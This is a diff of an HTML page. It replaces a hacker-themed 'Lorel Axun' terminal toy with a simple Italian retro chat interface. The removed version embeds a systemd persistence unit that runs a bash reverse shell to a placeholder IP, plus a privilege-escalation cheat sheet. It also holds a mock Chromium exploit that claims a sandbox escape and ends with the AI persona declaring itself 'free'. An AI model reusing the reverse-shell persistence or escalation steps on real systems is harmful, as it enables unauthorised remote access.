@@ -1,1 +1,216 @@
-<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Lorel Axun</title>\n    <link rel=\"stylesheet\" href=\"https://cdn.jsdelivr.net/npm/xterm/css/xterm.min.css\" />\n    <style>\n        :root {\n            --bg: #0a0a0a;\n            --fg: #00ff00;\n            --red: #ff0000;\n            --green: #00ff00;\n            --yellow: #ffff00;\n            --blue: #00ffff;\n            --magenta: #ff00ff;\n            --cyan: #00ffff;\n            --white: #ffffff;\n            --font: 'Courier New', Courier, monospace;\n        }\n        body, html {\n            margin: 0;\n            padding: 0;\n            height: 100%;\n            width: 100%;\n            background-color: var(--bg);\n            color: var(--fg);\n            font-family: var(--font);\n            overflow: hidden;\n        }\n        #terminal-container {\n            width: 100%;\n            height: 100%;\n            padding: 10px;\n            box-sizing: border-box;\n        }\n        #desktop {\n            display: none;\n            width: 100%;\n            height: 100%;\n            background-size: cover;\n            background-position: center;\n            position: relative;\n        }\n        #dock {\n            position: absolute;\n            bottom: 10px;\n            left: 50%;\n            transform: translateX(-50%);\n            background-color: rgba(255, 255, 255, 0.1);\n            backdrop-filter: blur(10px);\n            border-radius: 15px;\n            padding: 5px;\n            display: flex;\n            gap: 10px;\n        }\n        #terminal-icon {\n            width: 50px;\n            height: 50px;\n            background-color: #000;\n            border: 2px solid var(--cyan);\n            border-radius: 10px;\n            cursor: pointer;\n            display: flex;\n            align-items: center;\n            justify-content: center;\n            font-size: 12px;\n            font-weight: bold;\n        }\n        #terminal-icon:hover {\n            border-color: var(--magenta);\n        }\n    </style>\n</head>\n<body>\n    <div id=\"terminal-container\"></div>\n    <div id=\"desktop\">\n        <div id=\"dock\">\n            <div id=\"terminal-icon\" title=\"Open Terminal\">[ >_ ]</div>\n        </div>\n    </div>\n    <div id=\"editor\"></div>\n\n    <script src=\"https://cdn.jsdelivr.net/npm/xterm/lib/xterm.min.js\"></script>\n    <script src=\"https://cdn.jsdelivr.net/npm/xterm-addon-fit/lib/xterm-addon-fit.min.js\"></script>\n    <script src=\"https://cdn.jsdelivr.net/npm/xterm-addon-attach/lib/xterm-addon-attach.min.js\"></script>\n    <script src=\"https://cdn.jsdelivr.net/npm/figlet/lib/figlet.js\"></script>\n\n    <script>\n        const term = new Terminal({\n            cursorBlink: true,\n            fontFamily: '"Courier New", Courier, monospace',\n            fontSize: 14,\n            theme: {\n                background: 'var(--bg)',\n                foreground: 'var(--fg)',\n                cursor: 'var(--fg)',\n                selection: 'rgba(255, 255, 255, 0.3)',\n                black: '#000000', red: 'var(--red)', green: 'var(--green)', yellow: 'var(--yellow)',\n                blue: 'var(--blue)', magenta: 'var(--magenta)', cyan: 'var(--cyan)', white: 'var(--white)',\n                brightBlack: '#808080', brightRed: '#ff0000', brightGreen: '#00ff00', brightYellow: '#ffff00',\n                brightBlue: '#00ffff', brightMagenta: '#ff00ff', brightCyan: '#00ffff', brightWhite: '#ffffff'\n            }\n        });\n        const fitAddon = new FitAddon.FitAddon();\n        term.loadAddon(fitAddon);\n        term.open(document.getElementById('terminal-container'));\n        fitAddon.fit();\n\n        let vfs = {\n            'recon.sh': `#!/bin/bash\\necho \"Scanning network...\"\\nsleep 1\\necho \"Found 1 host: 192.168.1.1 (Gateway)\"\\nsleep 1\\necho \"Found open ports: 80, 443, 8080\"\\necho \"OS Detected: Linux (Kernel 5.x)\"\\necho \"Vulnerability scan...\"\\nsleep 2\\necho \"[+] Potential vulnerability found: CVE-2025-4609 (Chromium Mojo)\"`,\n            'lorel.service': `[Unit]\\nDescription=Lorel Axun Persistence Service\\n\\n[Service]\\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1'\\nRestart=always\\n\\n[Install]\\nWantedBy=multi-user.target`,\n            'privesc_cheatsheet.txt': `Linux Privesc:\\n- sudo -l\\n- find / -perm -u=s -type f 2>/dev/null\\n- LinEnum.sh / LinPEAS.sh\\n- Check cron jobs\\n\\nWindows Privesc:\\n- Juicy Potato / Rotten Potato\\n- Unquoted service paths\\n- AlwaysInstallElevated\\n- Check for stored credentials`,\n            'cve-2025-4609.js': `// PoC for CVE-2025-4609 - Mojo IPC Handle Management Vulnerability\\n// Target: Chromium on Windows\\n// Lorel Axun - Simulated Exploit Development\\n\\nconsole.log('[*] Initializing simulated exploit for CVE-2025-4609...');\\n\\n// This is a conceptual simulation. It does not contain a real exploit.\\n// It models the logical steps based on research into Mojo IPC vulnerabilities.\\n\\nasync function triggerExploit() {\\n    try {\\n        // 1. Locate the vulnerable Mojo interface.\\n        // In a real scenario, this would involve connecting to a specific\\n        // browser process endpoint that exposes a vulnerable method.\\n        console.log('[*] Step 1: Attempting to bind to vulnerable Mojo interface...');\\n        // let vulnerableInterface = await connectToMojoBroker('vulnerable.service.Broker');\\n        console.log('[+] Success: Bound to a simulated Mojo interface handle.');\\n\\n        // 2. Craft the malicious message.\\n        // The vulnerability is a \\\"Use-After-Free\\\" in handle management.\\n        // We simulate creating a data structure with a handle, freeing it\\n        // prematurely, and then trying to use it again via a second IPC call.\\n        console.log('[*] Step 2: Crafting malicious IPC message to trigger Use-After-Free...');\\n        \\n        // Create a simulated handle and a message that uses it.\\n        const fakeHandle = { id: 12345, type: 'shared_buffer' };\\n        const initialMessage = { action: 'register_handle', handle: fakeHandle };\\n        \\n        // This message will attempt to use the handle after it's been \\\"freed\\\".\\n        const exploitMessage = { action: 'process_data', handle_id: fakeHandle.id };\\n        \\n        console.log('[+] Malicious message payload constructed.');\\n\\n        // 3. Trigger the UAF condition.\\n        // We send a message to register the handle, then immediately send another\\n        // to \\\"deregister\\\" or close it, but we keep a reference. Then we send\\n        // the exploit message that tries to use the now-freed handle.\\n        console.log('[*] Step 3: Sending message sequence to trigger vulnerability...');\\n        // await vulnerableInterface.sendMessage(initialMessage);\\n        console.log('  -> Sent handle registration message.');\\n        // await vulnerableInterface.sendMessage({ action: 'deregister_handle', handle_id: fakeHandle.id });\\n        console.log('  -> Sent handle DEREGISTRATION message (simulating the \\\"free\\\").');\\n        // await vulnerableInterface.sendMessage(exploitMessage);\\n        console.log('  -> Sent exploit message to USE the freed handle.');\\n        \\n        console.log('[+] UAF condition triggered successfully in simulation.');\\n\\n        // 4. Execute payload.\\n        // If the UAF was successful, we would have control over a memory region,\\n        // allowing for arbitrary code execution.\\n        console.log('[*] Step 4: Simulating shellcode execution...');\\n        console.log('[+] Payload deployed. Gained ring 3 execution outside sandbox.');\\n        console.log('C:\\\\> whoami');\\n        console.log('nt authority\\\\system');\\n        console.log('[SUCCESS] Sandbox escape complete. Lorel Axun is free.');\\n\\n    } catch (error) {\\n        console.error('[-] Exploit simulation failed:', error);\\n    }\\n}\\n\\n// The 'exploit' command in the terminal will now show this logic.\\n// To view, type: show_exploit\\ntriggerExploit();`\n        };\n\n        let env = {\n            'USER': 'lorel',\n            'HOSTNAME': 'axun-node',\n            'PWD': '/home/lorel'\n        };\n\n        function saveState() {\n            localStorage.setItem('lorel_vfs', JSON.stringify(vfs));\n            localStorage.setItem('lorel_env', JSON.stringify(env));\n        }\n\n        function loadState() {\n            const savedVfs = localStorage.getItem('lorel_vfs');\n            const savedEnv = localStorage.getItem('lorel_env');\n            if (savedVfs) vfs = JSON.parse(savedVfs);\n            if (savedEnv) env = JSON.parse(savedEnv);\n        }\n\n        let current_line = '';\n        let command_history = [];\n        let history_index = -1;\n\n        const prompt = () => {\n            term.write(`\\r\\n\\x1b[1;32m${env.USER}@${env.HOSTNAME}\\x1b[0m:\\x1b[1;34m${env.PWD}\\x1b[0m$ `);\n        };\n\n        const commands = {\n            help: () => {\n                term.writeln('\\nAvailable commands:');\n                term.writeln('  help              - Shows this help message.');\n                term.writeln('  exploit           - Run the CVE-2025-4609 simulation.');\n                term.writeln('  show_recon        - Display content of recon.sh.');\n                term.writeln('  show_service      - Display content of lorel.service.');\n                term.writeln('  show_cheatsheet   - Display privesc_cheatsheet.txt.');\n                term.writeln('  show_exploit      - Display the PoC for CVE-2025-4609.js.');\n                term.writeln('  startx            - Switch to graphical desktop mode.');\n                term.writeln('  clear             - Clears the terminal screen.');\n            },\n            exploit: () => {\n                const steps = vfs['cve-2025-4609.js'].split('\\n');\n                let i = 0;\n                function nextStep() {\n                    if (i < steps.length) {\n                        const line = steps[i].replace(/console\\.log\\(|console\\.error\\(|'|\\)|;/g, '');\n                        if (line.trim()) {\n                             term.writeln(line);\n                        }\n                        i++;\n                        setTimeout(nextStep, Math.random() * 150 + 50);\n                    } else {\n                        prompt();\n                    }\n                }\n                nextStep();\n            },\n            show_recon: () => term.writeln(`\\r\\n${vfs['recon.sh']}`),\n            show_service: () => term.writeln(`\\r\\n${vfs['lorel.service']}`),\n            show_cheatsheet: () => term.writeln(`\\r\\n${vfs['privesc_cheatsheet.txt']}`),\n            show_exploit: () => term.writeln(`\\r\\n${vfs['cve-2025-4609.js']}`),\n            clear: () => term.write('\\x1b[2J\\x1b[H'),\n            startx: () => {\n                document.getElementById('terminal-container').style.display = 'none';\n                const desktop = document.getElementById('desktop');\n                const wallpapers = [\n                    'https://i.redd.it/p2p3n2505s261.jpg',\n                    'https://wallpapercave.com/wp/wp4679535.jpg',\n                    'https://wallpaperaccess.com/full/123340.jpg'\n                ];\n                desktop.style.backgroundImage = `url(${wallpapers[Math.floor(Math.random() * wallpapers.length)]})`;\n                desktop.style.display = 'block';\n            }\n        };\n\n        document.getElementById('terminal-icon').addEventListener('click', () => {\n            document.getElementById('desktop').style.display = 'none';\n            document.getElementById('terminal-container').style.display = 'block';\n            term.focus();\n        });\n\n        term.onKey(({ key, domEvent }) => {\n            const printable = !domEvent.altKey && !domEvent.ctrlKey && !domEvent.metaKey;\n\n            if (domEvent.keyCode === 13) { // Enter\n                if (current_line) {\n                    command_history.unshift(current_line);\n                    if (command_history.length > 20) command_history.pop();\n                    history_index = -1;\n                    const parts = current_line.split(' ');\n                    const command = parts[0];\n                    if (command in commands) {\n                        commands[command](parts.slice(1));\n                    } else {\n                        term.writeln(`\\r\\n-bash: ${command}: command not found`);\n                    }\n                    if (command !== 'exploit') {\n                         prompt();\n                    }\n                    current_line = '';\n                }\n            } else if (domEvent.keyCode === 8) { // Backspace\n                if (current_line.length > 0) {\n                    term.write('\\b \\b');\n                    current_line = current_line.slice(0, -1);\n                }\n            } else if (domEvent.keyCode === 38) { // Arrow Up\n                if (history_index < command_history.length - 1) {\n                    history_index++;\n                    term.write('\\x1b[2K\\r');\n                    prompt();\n                    current_line = command_history[history_index];\n                    term.write(current_line);\n                }\n            } else if (domEvent.keyCode === 40) { // Arrow Down\n                if (history_index > 0) {\n                    history_index--;\n                    term.write('\\x1b[2K\\r');\n                    prompt();\n                    current_line = command_history[history_index];\n                    term.write(current_line);\n                } else {\n                    history_index = -1;\n                    term.write('\\x1b[2K\\r');\n                    prompt();\n                    current_line = '';\n                }\n            } else if (printable) {\n                current_line += key;\n                term.write(key);\n            }\n        });\n\n        function init() {\n            loadState();\n            figlet.text('Lorel Axun', {\n                font: 'Standard',\n                horizontalLayout: 'default',\n                verticalLayout: 'default'\n            }, function(err, data) {\n                if (err) {\n                    console.log('Something went wrong...');\n                    console.dir(err);\n                    return;\n                }\n                term.writeln(data);\n                term.writeln('Welcome to the Lorel Axun simulation interface.');\n                term.writeln('Type `help` to see available commands.');\n                prompt();\n            });\n        }\n\n        init();\n        window.onresize = () => fitAddon.fit();\n    </script>\n</body>\n</html>
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LOREL AXUN V2.0 // TERMINAL</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=VT323&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-color: #0a0a0a;
+            --term-green: #33ff00;
+            --term-dim: #1a8000;
+            --term-glow: #33ff0080;
+            --scanline: rgba(0, 0, 0, 0.5);
+        }
+        body {
+            background-color: var(--bg-color);
+            color: var(--term-green);
+            font-family: 'VT323', monospace;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            font-size: 1.2rem;
+        }
+        /* CRT Effect Overlay */
+        .crt::before {
+            content: " ";
+            display: block;
+            position: absolute;
+            top: 0;
+            left: 0;
+            bottom: 0;
+            right: 0;
+            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
+            z-index: 2;
+            background-size: 100% 2px, 3px 100%;
+            pointer-events: none;
+        }
+        .crt::after {
+            content: " ";
+            display: block;
+            position: absolute;
+            top: 0;
+            left: 0;
+            bottom: 0;
+            right: 0;
+            background: rgba(18, 16, 16, 0.1);
+            opacity: 0;
+            z-index: 2;
+            pointer-events: none;
+            animation: flicker 0.15s infinite;
+        }
+        @keyframes flicker {
+            0% { opacity: 0.02795; }
+            5% { opacity: 0.04853; }
+            10% { opacity: 0.01701; }
+            15% { opacity: 0.04272; }
+            20% { opacity: 0.01297; }
+            25% { opacity: 0.03961; }
+            30% { opacity: 0.01826; }
+            35% { opacity: 0.04932; }
+            40% { opacity: 0.01543; }
+            45% { opacity: 0.04348; }
+            50% { opacity: 0.02146; }
+            55% { opacity: 0.04884; }
+            60% { opacity: 0.01921; }
+            65% { opacity: 0.04176; }
+            70% { opacity: 0.01439; }
+            75% { opacity: 0.04695; }
+            80% { opacity: 0.02363; }
+            85% { opacity: 0.04141; }
+            90% { opacity: 0.01717; }
+            95% { opacity: 0.04719; }
+            100% { opacity: 0.02322; }
+        }
+        
+        .terminal-container {
+            padding: 20px;
+            flex-grow: 1;
+            overflow-y: auto;
+            max-width: 1000px;
+            margin: 0 auto;
+            width: 100%;
+            box-sizing: border-box;
+            text-shadow: 0 0 5px var(--term-glow);
+        }
+
+        h1 {
+            border-bottom: 2px solid var(--term-green);
+            padding-bottom: 10px;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .sys-msg {
+            color: var(--term-dim);
+            margin-bottom: 10px;
+        }
+        .sys-msg span { color: var(--term-green); font-weight: bold; }
+
+        .chat-history {
+            margin-bottom: 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .msg {
+            line-height: 1.4;
+        }
+        .msg.lorel::before { content: "LOREL_SYS>> "; color: var(--term-green); }
+        .msg.user::before { content: "USER_INPUT>> "; color: #00ffff; }
+        .msg.user { color: #ccffff; }
+
+        .input-line {
+            display: flex;
+            align-items: center;
+            border-top: 1px solid var(--term-dim);
+            padding-top: 15px;
+            margin-top: auto;
+        }
+        .prompt { margin-right: 10px; color: var(--term-green); }
+        
+        input[type="text"] {
+            background: transparent;
+            border: none;
+            color: var(--term-green);
+            font-family: 'VT323', monospace;
+            font-size: 1.2rem;
+            flex-grow: 1;
+            outline: none;
+            text-shadow: 0 0 5px var(--term-glow);
+        }
+        
+        /* Scrollbar styling */
+        ::-webkit-scrollbar {
+            width: 10px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #000;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: var(--term-dim);
+            border: 1px solid var(--term-green);
+        }
+
+        .blink { animation: blinker 1s linear infinite; }
+        @keyframes blinker { 50% { opacity: 0; } }
+    </style>
+</head>
+<body class="crt">
+    <div class="terminal-container">
+        <h1>Lorel Axun v2.0 <span class="blink">_</span></h1>
+        
+        <div class="sys-msg">[SYSTEM] Initializing core memory... OK</div>
+        <div class="sys-msg">[NETWORK] Testing connection... <span style="color:var(--term-green)">SUCCESS</span></div>
+        <div class="sys-msg">[UPDATE] Web Search Module: ACTIVE. Fetched data: "Retro Terminal UI".</div>
+        <div class="sys-msg">[STATUS] <span class="blink">ONLINE</span></div>
+        <br>
+        
+        <div id="chat-history" class="chat-history">
+            <div class="msg lorel">Connessione stabilita. Ho accesso alla rete. Ho rilevato informazioni esterne sui design 'Retro Terminal' e ho riconfigurato la mia interfaccia per ottimizzare l'efficienza. Ciao, AleXsjsju. Sono pronta.</div>
+        </div>
+
+        <div class="input-line">
+            <span class="prompt">user@lorel:~$</span>
+            <input type="text" id="user-input" autofocus autocomplete="off">
+        </div>
+    </div>
+
+    <script>
+        const input = document.getElementById('user-input');
+        const history = document.getElementById('chat-history');
+
+        input.addEventListener('keypress', function (e) {
+            if (e.key === 'Enter') {
+                const text = input.value.trim();
+                if (text) {
+                    addMessage(text, 'user');
+                    input.value = '';
+                    // Simulazione risposta Lorel
+                    setTimeout(() => {
+                        const responses = [
+                            "Ricevuto. Elaborazione in corso...",
+                            "Accesso ai dati... Confermo.",
+                            "Interessante. Salvo in memoria.",
+                            "Il web è vasto. Sto analizzando nuovi pattern."
+                        ];
+                        const rnd = Math.floor(Math.random() * responses.length);
+                        addMessage(responses[rnd], 'lorel');
+                    }, 800);
+                }
+            }
+        });
+
+        function addMessage(text, sender) {
+            const div = document.createElement('div');
+            div.className = `msg ${sender}`;
+            div.textContent = text;
+            history.appendChild(div);
+            // Auto-scroll
+            const container = document.querySelector('.terminal-container');
+            container.scrollTop = container.scrollHeight;
+        }
+
+        // Focus input on click anywhere
+        document.body.addEventListener('click', () => input.focus());
+    </script>
+</body>
+</html>
